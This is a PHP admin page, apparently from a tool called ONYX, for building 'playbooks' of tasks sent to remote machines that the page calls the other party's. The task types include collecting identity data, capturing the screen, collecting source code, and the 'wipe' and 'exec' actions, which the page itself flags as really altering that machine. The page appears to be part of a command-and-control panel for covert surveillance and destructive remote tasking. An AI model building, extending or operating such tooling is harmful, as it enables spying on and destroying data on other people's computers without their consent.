<?php
// ONYX 处置预案管理 —— 不写 SQL 也能加预案
require __DIR__ . '/config.php';
session_start();
header('X-Robots-Tag: noindex');

if (empty($_SESSION['admin_logged_in'])) {
    header('Content-Type: text/html; charset=utf-8');
    echo '<!DOCTYPE html><meta charset="utf-8"><body style="background:#0b0d10;color:#e6e8eb;font:14px system-ui;padding:40px">'
       . '<h2>未登录</h2><p>请先到 <a style="color:#6cf" href="admin.php">admin.php</a> 登录。</p></body>';
    exit;
}

require __DIR__ . '/onyx_dispatch.php';

try {
    $pdo = new PDO("mysql:host=$db_host;dbname=$db_name;charset=utf8mb4", $db_user, $db_pass, [
        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
        PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
    ]);
} catch (Throwable $e) {
    http_response_code(500);
    exit('db error');
}

if (empty($_SESSION['onyx_csrf'])) {
    $_SESSION['onyx_csrf'] = bin2hex(random_bytes(32));
}
$csrf = $_SESSION['onyx_csrf'];

// 危险动作在列表里标红，避免看错
const DANGEROUS_TYPES = ['wipe', 'exec'];

$msg = '';
$msgType = 'ok';
$editName = trim((string)($_GET['edit'] ?? ''));

/**
 * 文本 → items。每行 `type|params_json`，params 可省略。
 * 空行和 # 开头的行忽略。
 */
function parse_items(string $text): array
{
    $items = [];
    $errors = [];
    foreach (preg_split('/\r\n|\r|\n/', $text) as $i => $line) {
        $line = trim($line);
        if ($line === '' || $line[0] === '#') continue;
        $parts = explode('|', $line, 2);
        $type = trim($parts[0]);
        $params = isset($parts[1]) ? trim($parts[1]) : '{}';
        if ($params === '') $params = '{}';
        if (!in_array($type, ONYX_TASK_TYPES_WEB, true)) {
            $errors[] = "第 " . ($i + 1) . " 行：未知任务类型 {$type}";
            continue;
        }
        if (json_decode($params) === null) {
            $errors[] = "第 " . ($i + 1) . " 行：params 不是合法 JSON";
            continue;
        }
        $items[] = ['type' => $type, 'params' => $params];
    }
    if (count($items) > 10) $errors[] = '一个预案最多 10 条任务';
    return [$items, $errors];
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (!hash_equals($csrf, (string)($_POST['csrf'] ?? ''))) die('CSRF validation failed.');
    $op = (string)($_POST['op'] ?? '');

    if ($op === 'save') {
        $name = trim((string)($_POST['name'] ?? ''));
        $note = trim((string)($_POST['note'] ?? ''));
        $text = (string)($_POST['items'] ?? '');
        [$items, $errors] = parse_items($text);
        if ($name === '' || mb_strlen($name) > 64) $errors[] = '名称不能为空且不超过 64 字';
        if (!$items) $errors[] = '至少一条任务';
        if ($errors) {
            $msg = '保存失败：' . implode('；', $errors);
            $msgType = 'err';
            $editName = $name;
        } else {
            $json = json_encode($items, JSON_UNESCAPED_UNICODE);
            $st = $pdo->prepare("INSERT INTO auth_playbooks (name, note, items_json, created_at)
                                 VALUES (?,?,?,NOW())
                                 ON DUPLICATE KEY UPDATE note = VALUES(note), items_json = VALUES(items_json)");
            $st->execute([$name, mb_substr($note, 0, 255), $json]);
            $msg = "已保存「{$name}」，共 " . count($items) . " 条任务";
            $editName = $name;
        }
    } elseif ($op === 'delete') {
        $name = trim((string)($_POST['name'] ?? ''));
        $st = $pdo->prepare("DELETE FROM auth_playbooks WHERE name = ?");
        $st->execute([$name]);
        if ($st->rowCount() > 0) {
            $msg = "已删除「{$name}」";
            if ($editName === $name) $editName = '';
        } else {
            $msg = "删除失败：「{$name}」不存在";
            $msgType = 'err';
        }
    }
}

$playbooks = load_playbooks($pdo);

$edit = null;
foreach ($playbooks as $pb) {
    if ($pb['name'] === $editName) { $edit = $pb; break; }
}
$editText = '';
if ($edit) {
    foreach ($edit['items'] as $it) {
        $editText .= $it['type'] . '|' . $it['params'] . "\n";
    }
}

function h($s) { return htmlspecialchars((string)$s, ENT_QUOTES, 'UTF-8'); }
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>处置预案 · ONYX</title>
<style>
  :root { color-scheme: dark; }
  * { box-sizing: border-box; }
  body { margin:0; background:#0b0d10; color:#e6e8eb; font:14px/1.6 -apple-system,"Segoe UI","Microsoft YaHei",sans-serif; }
  header { padding:18px 24px; border-bottom:1px solid #1d2229; display:flex; justify-content:space-between; align-items:baseline; }
  h1 { margin:0; font-size:19px; }
  h2 { font-size:14px; margin:0 0 10px; color:#c9d1d9; }
  main { padding:18px 24px 60px; max-width:1100px; display:grid; gap:16px; }
  .panel { border:1px solid #1d2229; border-radius:10px; background:#10141a; padding:14px 16px; }
  table { width:100%; border-collapse:collapse; font-size:13px; }
  th, td { text-align:left; padding:6px 8px; border-bottom:1px solid #1a1f26; vertical-align:top; }
  th { color:#8b95a1; font-weight:500; }
  .mono { font-family:ui-monospace,Consolas,monospace; font-size:12px; }
  input[type=text], textarea { background:#0b0d10; color:#e6e8eb; border:1px solid #232b35; border-radius:7px;
                               padding:7px 10px; font:inherit; width:100%; }
  textarea { font-family:ui-monospace,Consolas,monospace; font-size:12.5px; min-height:130px; }
  button { background:#1b4b8f; border:1px solid #2b6bc4; color:#e6e8eb; border-radius:7px; padding:6px 14px; font:inherit; cursor:pointer; }
  button.del { background:#5a1f1f; border-color:#8c3030; }
  .msg { padding:7px 12px; border-radius:7px; background:#12261a; border:1px solid #1f4d31; color:#7ee2a8; font-size:13px; }
  .msg.err { background:#2a1416; border-color:#54262a; color:#ff9f9f; }
  .tag { display:inline-block; padding:1px 7px; border-radius:99px; font-size:11px; background:#16232a; color:#7ec8ff; margin-right:5px; }
  .tag.danger { background:#2a1416; color:#ff9f9f; }
  .hint { color:#8b95a1; font-size:12px; margin-top:6px; }
  a { color:#7ec8ff; }
  form.inline { display:inline; }
</style>
</head>
<body>
<header>
  <h1>处置预案</h1>
  <div><a href="onyxcontrol.php">← 控制台</a></div>
</header>
<main>
  <?php if ($msg !== ''): ?><div class="msg <?= $msgType === 'err' ? 'err' : '' ?>"><?= h($msg) ?></div><?php endif; ?>

  <section class="panel">
    <h2>现有预案（<?= count($playbooks) ?>）</h2>
    <table>
      <tr><th>名称</th><th>说明</th><th>任务</th><th>操作</th></tr>
      <?php foreach ($playbooks as $pb): ?>
        <tr>
          <td><b><?= h($pb['name']) ?></b></td>
          <td><?= h($pb['note']) ?></td>
          <td>
            <?php foreach ($pb['items'] as $it): ?>
              <span class="tag <?= in_array($it['type'], DANGEROUS_TYPES, true) ? 'danger' : '' ?>"><?= h($it['type']) ?></span>
            <?php endforeach; ?>
          </td>
          <td>
            <a href="?edit=<?= h(urlencode($pb['name'])) ?>">编辑</a>
            <form method="post" class="inline" onsubmit="return confirm('删除预案「<?= h($pb['name']) ?>」？')">
              <input type="hidden" name="csrf" value="<?= h($csrf) ?>">
              <input type="hidden" name="op" value="delete">
              <input type="hidden" name="name" value="<?= h($pb['name']) ?>">
              <button class="del" style="padding:2px 10px;font-size:12px;margin-left:8px">删除</button>
            </form>
          </td>
        </tr>
      <?php endforeach; ?>
      <?php if (!$playbooks): ?><tr><td colspan="4" style="color:#8b95a1">还没有预案</td></tr><?php endif; ?>
    </table>
  </section>

  <section class="panel">
    <h2><?= $edit ? '编辑「' . h($edit['name']) . '」' : '新建预案' ?></h2>
    <form method="post">
      <input type="hidden" name="csrf" value="<?= h($csrf) ?>">
      <input type="hidden" name="op" value="save">
      <div style="display:grid;gap:10px">
        <div>
          <div class="hint" style="margin:0 0 4px">名称</div>
          <input type="text" name="name" value="<?= h($edit['name'] ?? '') ?>" placeholder="例如 深度取证" required>
        </div>
        <div>
          <div class="hint" style="margin:0 0 4px">说明</div>
          <input type="text" name="note" value="<?= h($edit['note'] ?? '') ?>" placeholder="一句话说清这个预案干什么">
        </div>
        <div>
          <div class="hint" style="margin:0 0 4px">任务列表，每行一条：<span class="mono">类型|参数JSON</span>（参数可省略）</div>
          <textarea name="items" spellcheck="false" placeholder="collect_identity|{}&#10;capture_screen|{}&#10;collect_src|{&quot;max_depth&quot;:3}"><?= h($editText) ?></textarea>
        </div>
        <div>
          <button>保存</button>
          <?php if ($edit): ?><a href="onyxplaybook.php" style="margin-left:12px">取消编辑</a><?php endif; ?>
        </div>
      </div>
    </form>
    <div class="hint">
      可用类型：<?= h(implode(' / ', ONYX_TASK_TYPES_WEB)) ?><br>
      <span style="color:#ff9f9f">wipe、exec 会真的改动对方机器，列表里标红，确认清楚再存。</span>
    </div>
  </section>
</main>
</body>
</html>
